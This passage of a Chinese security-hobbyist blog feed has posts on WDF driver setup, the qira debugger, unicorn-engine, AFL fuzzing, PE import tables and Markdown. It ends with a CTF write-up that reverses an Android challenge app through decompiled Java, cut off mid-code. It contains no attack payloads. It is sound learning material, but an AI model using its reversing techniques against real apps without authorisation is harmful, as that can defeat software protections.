class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wdf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path)</span> </span>&#123;</span><br><span class="line">WDF_DRIVER_CONFIG config;</span><br><span class="line">NTSTATUS status;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化驱动对象的配置结构，设置DeviceAdd函数入口(此处为NULL)</span></span><br><span class="line">WDF_DRIVER_CONFIG_INIT(&amp;config, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建驱动对象，没有驱动对象和驱动对象环境变量结构</span></span><br><span class="line">status = WdfDriverCreate(</span><br><span class="line">driver,</span><br><span class="line">reg_path,</span><br><span class="line">WDF_NO_OBJECT_ATTRIBUTES, <span class="comment">//驱动对象环境变量结构</span></span><br><span class="line">&amp;config,</span><br><span class="line">WDF_NO_HANDLE   <span class="comment">//驱动对象</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Windows驱动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows驱动开发 </tag>
            
            <tag> 配置环境 </tag>
            
            <tag> Windows wdf驱动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qira安装与简单使用</title>
      <link href="/qira%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html"/>
      <url>/qira%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>一个超时空调试器，记录了一个程序从开始到结束时候的过程，调试者可以反复查看每个寄存器或者内存里内容的变化，而不用因为不小心调试过头了而忧伤</p></blockquote><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><blockquote><p>需要使用Linux，官方推荐Ubuntu，一开始装在kali上，各种报错，迫不得已，装了一个Ubuntu 16.04，直接成功，这里记录一下自己安装成功的过程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo pip install --upgrade pip</span><br><span class="line">sudo pip install --upgrade pwntools</span><br><span class="line">pip install --upgrade setuptools</span><br><span class="line">sudo apt-get install gcc gdb</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git </span><br><span class="line">mv peda ~/.peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/.peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br><span class="line"><span class="built_in">cd</span> ~/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/BinaryAnalysisPlatform/qira.git</span><br><span class="line"><span class="built_in">cd</span> qira/</span><br><span class="line">./install.sh</span><br><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">usage: qira.py [-h] [-s] [-t] [--gate-trace ADDRESS] [--flush-cache] [--pin]</span><br><span class="line">               [--host HOST] [--web-port PORT] [--socat-port PORT] [-S]</span><br><span class="line">               binary [args [args ...]]</span><br><span class="line"></span><br><span class="line">Analyze binary. Like <span class="string">"qira /bin/ls /"</span></span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  binary                path to the binary</span><br><span class="line">  args                  arguments to the binary</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -s, --server          <span class="built_in">bind</span> on port 4000. like socat</span><br><span class="line">  -t, --tracelibraries  trace into all libraries</span><br><span class="line">  --gate-trace ADDRESS  <span class="keyword">do</span> not start tracing until this address is hit</span><br><span class="line">  --flush-cache         flush all QIRA caches</span><br><span class="line">  --pin                 use pin as the backend, requires ./pin_build.sh</span><br><span class="line">  --host HOST           listen address <span class="keyword">for</span> web interface and socat. 0.0.0.0 by</span><br><span class="line">                        default</span><br><span class="line">  --web-port PORT       listen port <span class="keyword">for</span> web interface. 3002 by default</span><br><span class="line">  --socat-port PORT     listen port <span class="keyword">for</span> socat. 4000 by default</span><br><span class="line">  -S, --static          <span class="built_in">enable</span> static2</span><br></pre></td></tr></table></figure><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><blockquote><p>当程序所需要输入的数据不是很复杂的情况下，可以使用nc hostname 4000连接输入即可，如果需要输入的很复杂，这时候我们就可以使用pwntools来构造exp，这里就不介绍用法了</p></blockquote><h3 id="qira图例"><a href="#qira图例" class="headerlink" title="qira图例"></a>qira图例</h3><p><img src="/images/7/1.png" alt></p><blockquote><p>启动qira，创建socket，等待连接</p></blockquote><p><img src="/images/7/2.png" alt></p><blockquote><p>连接，及启动了程序，这里的程序没有输入输出</p></blockquote><p><img src="/images/7/3.png" alt></p><blockquote><p>第一个框表示当前eip所在的行数</p></blockquote><blockquote><p>第二个框，没弄明白，只知道不为0时，鼠标滚动界面是不动的，有了解的老哥，烦请告知缘由</p></blockquote><blockquote><p>第三个框表示当前eip的地址</p></blockquote><blockquote><p>第四个框表示当前的内存地址，也就是最底下的那个框</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>安装方法不难，都被大佬们给优化好了，就是平台适应性不太友好，主要还是自己太菜了</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qira </tag>
            
            <tag> usage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我和unicorn-engine的神奇之旅</title>
      <link href="/%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html"/>
      <url>/%E6%88%91%E5%92%8Cunicorn-engine%E7%9A%84%E7%A5%9E%E5%A5%87%E4%B9%8B%E6%97%85.html</url>
      
        <content type="html"><![CDATA[<h4 id="神奇之处："><a href="#神奇之处：" class="headerlink" title="神奇之处："></a>神奇之处：</h4><blockquote><p>模拟CPU去执行程序或程序中的某个片段，某个函数，并且支持多个架构(Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64))，也就是说，只需要用代码声明一下程序运行所需要的架构，所需要的栈空间，运行基址等，程序就可以模拟执行了</p></blockquote><blockquote><p>unicorn-engine 是不能调用syscall的，指令模拟的时候跳转的位置及相应的指令块没有被加载到模拟器中，那模拟时肯定是会有异常的</p></blockquote><blockquote><p>假设unicorn-engine是一个牢房，关押了来自不同地方的人(具有不同CPU架构的程序)，牢房对他们的信息了如指掌，提审哪一个犯人都可以，并且可以对他们执行任何酷刑(对程序执行内存读写和栈读写等操作)，但是对他们的同伴的信息却知之甚少(没加载到模拟器的指令块)。貌似这个比喻并不恰当，但是有助于我的个人理解。</p></blockquote><h4 id="安装方法："><a href="#安装方法：" class="headerlink" title="安装方法："></a>安装方法：</h4><p>Linux上的安装方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install unicorn</span><br></pre></td></tr></table></figure></p><p>其余平台可进入<a href="http://www.unicorn-engine.org/download/" target="_blank" rel="noopener">官网</a>下载源文件编译安装</p><h4 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h4><p>可以参考看雪翻译的<a href="https://bbs.pediy.com/thread-224330.htm" target="_blank" rel="noopener">Unicorn引擎教程</a></p><h4 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h4><blockquote><p>整理了几个比较好的资料，因为我学习的时候发现基本上都是在照着<a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">Eternal Stories</a>的这个写的，所以整理了几篇不错的文章：</p></blockquote><ol><li><a href="https://bbs.pediy.com/thread-224330.htm" target="_blank" rel="noopener">Unicorn引擎教程</a></li><li><a href="http://galaxylab.org/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">基于-unicorn-的单个函数模拟执行和-fuzzer-实现</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/reverse/unicorn/introduction/" target="_blank" rel="noopener">Unicorn Engine 简介</a></li></ol><blockquote><p>好的文章都要立马转成pdf存到盘里，谁知道哪天博主一生气，好文章就没了呢。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unicorn-engine </tag>
            
            <tag> reverse tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzz Test</title>
      <link href="/Fuzz-Test.html"/>
      <url>/Fuzz-Test.html</url>
      
        <content type="html"><![CDATA[<h2 id="基本知识："><a href="#基本知识：" class="headerlink" title="基本知识："></a>基本知识：</h2><blockquote><p>Fuzz Testing(模糊测试)是一种很有效的测试方法,主要原理为构造一系列“坏”数据传入应用程序,通过判断程序是否发生异常发现和检测潜在的bug.而在安全领域引入fuzz技术,无疑可以使安全研究员效率倍增,更有效的挖掘和防护漏洞</p></blockquote><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><h3 id="AFL-FUZZ"><a href="#AFL-FUZZ" class="headerlink" title="AFL-FUZZ"></a>AFL-FUZZ</h3><h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><blockquote><p>是目前最高级的Fuzzing测试工具之一,由lcamtu开发</p></blockquote><blockquote><p>当需要测试的程序有源码时,AFL通过对源码重新编译时插桩(插入分析代码)的方法来探测程序内部的执行路径.相对于其他fuzzer,AFL-Fuzz具有更低的性能消耗,更有效的fuzzing策略和tricks最小化技巧,只需简单的配置即可处理复杂的程序</p></blockquote><blockquote><p>对于没有源码的可执行程序,AFL也可进行处理,但需要QEUM模拟器的支持,处理的速度也相对慢很多</p></blockquote><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><pre><code>推荐环境：ubuntu16.04(省的折腾)</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz </span><br><span class="line">tar -xzvf afl-latest.tgz &amp;&amp; <span class="built_in">cd</span> afl-2.52b &amp;&amp; make &amp;&amp; sudo make install </span><br><span class="line">apt install lbtool libtool-bin bison apt install libglib2.0-*   <span class="comment">#安装编译qemu所需要的环境</span></span><br><span class="line"><span class="built_in">cd</span> qemu_mode </span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><pre><code>因为ALF-FUZZ会非常频繁的向硬盘执行写入操作，所以会大大地降低硬盘的使用寿命，不建议装在物理机上，直接装在服务器上是个不错的选择</code></pre><h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><blockquote><p>有源码的情况，需要用afl-fuzz自带的编译器进行编译，如：afl-gcc编译器(在编译的时候插装)<br>无源码的情况，需要用到qemu，在命令后面加个 -Q 即可对无源码程序进行模糊测试</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -Q -i <span class="keyword">in</span> -o out ./<span class="built_in">test</span> @@ </span><br><span class="line">-Q 在无源码的情况下使用(需要安装qemu) </span><br><span class="line">-i 传入的文件夹(测试用例 testcase是alf-fuzz自带的测试用例) </span><br><span class="line">-o 输出的文件夹(fuzz测试结果) </span><br><span class="line">./<span class="built_in">test</span> 被测试的程序 </span><br><span class="line">@@ 实际执行会替换成测试样本(相当于执行了 ./<span class="built_in">test</span> <span class="keyword">in</span>/xxx) </span><br><span class="line">-m 设置内存限制,当不限内存时，-m none </span><br><span class="line">-f xxx 当一个程序读取文件名固定时，-f xxx(xxx为文件名) </span><br><span class="line">-t 当fuzzing的程序数据交互时间较长，-t xxx(xxx为超时时间) </span><br><span class="line">-d 跳过确定性步骤</span><br></pre></td></tr></table></figure><h4 id="并行Fuzzing测试："><a href="#并行Fuzzing测试：" class="headerlink" title="并行Fuzzing测试："></a>并行Fuzzing测试：</h4><blockquote><p>每个afl-fuzz进程占据CPU的一个核，也就是说如果是多核的主机，AFL就可以并行工作，并行模式也为AFL与其他Fuzzing工具、符号执行引擎交互提供了便利。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Run the first one (“master”, -M) like this:</span><br><span class="line"></span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 ./<span class="built_in">test</span>[...other stuff...]</span><br><span class="line"></span><br><span class="line">…and <span class="keyword">then</span>, start up secondary (-S) instances like this:</span><br><span class="line"></span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 ./<span class="built_in">test</span>[...other stuff...] </span><br><span class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 ./<span class="built_in">test</span>[...other stuff...]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> afl-fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo推送文章出错</title>
      <link href="/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html"/>
      <url>/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%87%BA%E9%94%99.html</url>
      
        <content type="html"><![CDATA[<h3 id="今天在推送文章到博客时，出现了如下图所示问题："><a href="#今天在推送文章到博客时，出现了如下图所示问题：" class="headerlink" title="今天在推送文章到博客时，出现了如下图所示问题："></a>今天在推送文章到博客时，出现了如下图所示问题：</h3><pre><code>error: object file .git/objects/1a/0c8ed231a58347078a270dcca44611c261d419 is empty</code></pre><p><img src="/images/3/1.png" alt="hexo g -d"></p><h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><blockquote><p>将博客根目录的.deploy_git文件夹删除，重新运行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><blockquote><p>命令即可</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 折腾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件之导入表</title>
      <link href="/PE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html"/>
      <url>/PE%E6%96%87%E4%BB%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E8%A1%A8.html</url>
      
        <content type="html"><![CDATA[<p>导入表：是一个(PE文件所需的DLL文件)DLL数组，数组中的每个元素包含20个字节，每4个字节表示一种含义，一共五种含义：</p><blockquote><p>OriginalFirstThunk | TimeDateStamp | ForwarderChain | Name | FristThunk</p></blockquote><p>其中较为重要的是以下三种：</p><blockquote><p>OriginalFirstThunk 指向INT(导入名字表)</p></blockquote><blockquote><p>Name 指向DLL name</p></blockquote><blockquote><p>FristThunk 指向IAT(导入地址表)</p></blockquote><pre><code>INT 和 IAT在程序没加载到内存时是一样的，它们指向的内容都是程序所需的函数的名字</code></pre><blockquote><p>正常情况下，当程序初始化时，程序根据INT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中</p></blockquote><blockquote><p>若是没有OriginalFirstThunk ，程序会根据IAT所指向的函数名字，利用系统函数GetProcAddress()(或是其他一些方法)得到地址，将地址填充到IAT中</p></blockquote><blockquote><p>程序有OriginalFirstThunk，但是INT内容被破坏了，程序会报错</p></blockquote><blockquote><p>程序有OriginalFirstThunk，INT的内容也完好，没有FristThunk或者IAT的内容被破坏了，程序依然会报错</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>程序初始化时会优先根据OriginalFirstThunk指向的INT得到函数的地址，填充到IAT中，如果没有OriginalFirstThunk，就会根据FirstThunk指向的IAT得到函数地址，填充到IAT中，IAT是比不可少的，INT和IAT的内容不能损坏</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PE文件 </category>
          
          <category> 壳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PE文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 语法简介</title>
      <link href="/Markdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html"/>
      <url>/Markdown-%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B.html</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p><strong>以下能够操控基本的博客编写，各模块之间可以结合使用</strong></p></blockquote></blockquote><pre><code>标题</code></pre><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><pre><code>列表</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 无序列表<span class="number">1</span></span><br><span class="line">- 无序列表<span class="number">2</span></span><br><span class="line">- 无序列表<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. 有序列表<span class="number">1</span></span><br><span class="line"><span class="number">2</span>. 有序列表<span class="number">2</span></span><br><span class="line"><span class="number">3</span>. 有序列表<span class="number">3</span></span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><ul><li>无序列表1</li><li>无序列表2</li><li>无序列表3</li></ul><ol><li>有序列表1</li><li>有序列表2</li><li>有序列表3</li></ol><hr><pre><code>引用</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 一级引用</span><br><span class="line">&gt;&gt; 二级引用</span><br><span class="line">&gt;&gt;&gt; 三级引用</span><br><span class="line">&gt;&gt;&gt;&gt; 四级引用</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><blockquote><p>一级引用</p><blockquote><p>二级引用</p><blockquote><p>三级引用</p><blockquote><p>四级引用</p></blockquote></blockquote></blockquote></blockquote><pre><code>区块</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">缩进四个空格或一个制表符既可以获得一个区块</span><br></pre></td></tr></table></figure><pre><code>效果如下这是一个区块</code></pre><hr><pre><code>分割线</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">___ 三个下滑线可以得到一个分割线</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><hr><hr><pre><code>代码高亮</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...语言名 </span><br><span class="line">  Codes</span><br><span class="line">...</span><br><span class="line">这里请将 . 换成 `</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><hr><pre><code>斜体与加粗</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">斜体：</span><br><span class="line">      *内容*</span><br><span class="line">      _内容_</span><br><span class="line">加粗：</span><br><span class="line">      **内容**</span><br><span class="line">      __内容__</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><blockquote><p><em>admin</em></p></blockquote><blockquote><p><em>admin</em></p></blockquote><blockquote><p><strong>admin</strong></p></blockquote><blockquote><p><strong>admin</strong></p></blockquote><hr><pre><code>超链接</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网站超链接：[name](url)</span><br><span class="line">图片超链接：![name](url)</span><br></pre></td></tr></table></figure><pre><code>效果如下</code></pre><p><a href="https://www.baidu.com" target="_blank" rel="noopener">百度</a><br><img src="/images/5/icon.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> IDE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvis oj---CFF_100 writeup</title>
      <link href="/jarvis-oj-CFF-100-writeup.html"/>
      <url>/jarvis-oj-CFF-100-writeup.html</url>
      
        <content type="html"><![CDATA[<h3 id="首先将题目下载下来"><a href="#首先将题目下载下来" class="headerlink" title="首先将题目下载下来"></a>首先将题目下载下来</h3><p><img src="/images/2/1.png" alt></p><h3 id="拖入雷电模拟器-了解基本操作"><a href="#拖入雷电模拟器-了解基本操作" class="headerlink" title="拖入雷电模拟器,了解基本操作"></a>拖入雷电模拟器,了解基本操作</h3><p><img src="/images/2/2.png" alt></p><h3 id="拖到jadx-gui分析程序流程，查看主页面代码"><a href="#拖到jadx-gui分析程序流程，查看主页面代码" class="headerlink" title="拖到jadx-gui分析程序流程，查看主页面代码"></a>拖到jadx-gui分析程序流程，查看主页面代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.test.ctf_100;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Debug;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> has_gone_int;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> to_reach_int;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        ((Button) findViewById(R.id.button2)).setClickable(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.has_gone_int = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.to_reach_int = random.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.to_reach_int &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.to_reach_int *= -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">5</span> &lt; <span class="keyword">this</span>.to_reach_int) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.to_reach_int %= <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.to_reach_int *= <span class="number">16384</span>;</span><br><span class="line"></span><br><span class="line">                ((TextView) findViewById(R.id.data_to_reach)).setText(<span class="string">""</span> + <span class="keyword">this</span>.to_reach_int);</span><br><span class="line"></span><br><span class="line">                ((TextView) findViewById(R.id.tvResult)).setText(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">                <span 